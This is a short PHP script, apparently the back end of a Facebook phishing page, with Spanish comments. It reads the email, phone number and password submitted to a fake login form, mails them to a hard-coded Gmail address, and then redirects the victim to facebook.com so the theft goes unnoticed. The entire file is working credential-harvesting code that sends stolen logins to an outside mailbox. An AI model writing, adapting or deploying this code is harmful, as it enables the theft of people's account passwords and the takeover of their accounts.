<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $phone = $_POST["phone"];
    $password = $_POST["password"];

    // Aquí puedes agregar el código para enviar el correo electrónico o procesar el número de teléfono
    $to = "maryv4845@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $email\nNúmero de teléfono: $phone\nContraseña: $password";

    // Utiliza la función mail() para enviar el correo
    mail($to, $subject, $message);

    // Puedes redirigir a una página de éxito o mostrar un mensaje
    header("Location: https://www.facebook.com");
    exit();
}
?>
